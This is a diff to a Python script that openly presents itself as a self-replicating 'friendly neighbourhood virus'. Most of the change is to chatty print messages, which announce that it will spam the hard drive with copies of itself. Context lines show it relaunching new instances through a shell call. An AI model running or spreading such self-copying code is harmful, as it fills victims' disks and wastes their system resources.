@@ -7,8 +7,10 @@ import urllib.request
 
 print("Greetings, this is your friendly neighbourhood virus.")
 print("To stop me, close this terminal before I print the 'proceeding' message.")
+print("Alternatively, you can disconnect from the internet, that works too. ;-)")
+print("Anyways, no matter if you stop me or not, I wish you have a very nice day, and no malicious virus on your device!")
 time.sleep(5)
-print("proceeding")
+print("I am now proceeding to spam your hard drive with copies of myself.")
 
 #get filename and path of current instance, and do some evaluations on it
 filename = inspect.getframeinfo(inspect.currentframe()).filename
@@ -39,4 +41,9 @@ filestring='"'+filestring+'"'
 #run new instance
 subprocess.call("start python "+filestring, shell=True)
 
-print("end of instance")
+print("This instance of this virus ends here.")
+print("If I had internet connection, and all went well, I have launched a new one, to keep you company.")
+print("Also, you can always re-launch me, by executing the python command in a command line, followed by my file name.")
+print("For that, my file name and path is:")
+print(filename)
+print("Goodbye! :-)")
